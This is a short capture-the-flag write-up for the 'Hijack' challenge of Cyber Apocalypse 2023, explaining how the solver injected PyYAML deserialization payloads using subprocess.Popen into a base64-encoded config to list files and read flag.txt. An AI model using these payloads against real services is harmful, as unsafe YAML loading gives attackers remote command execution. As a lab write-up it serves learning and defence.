---
layout: load_md
title: The White Circle | Cyber Apocalypse 2023 | Hijack Writeup
desc: Check out our writeup for Hijack for Cyber Apocalypse 2023 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2023
parent: cyber_apocalypse_2023
category: misc
challenge: Hijack
tags: "misc, starry"
date: 2023-03-27T00:00:00+00:00
last_modified_at: 2023-03-27T00:00:00+00:00
---


> Solved by Starry-Lord


![](https://i.imgur.com/c1ZeYkj.png)


Connect with nc to the docker instance, then create a config and decode the base 64. We can see it gives back YAML syntax so we can try to inject commands with subprocess.Popen:

After base64 encoding it, and using the “Load config” option, This worked!

    !!python/object/apply:subprocess.Popen
    - ls

I had to dig a little more to find how to give arguments to the command:


    !!python/object/apply:subprocess.Popen
    - !!python/tuple
      - ls
      - -la

  
And solved:

```
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cat
  - flag.txt
```

![](https://i.imgur.com/b0l46TJ.png)

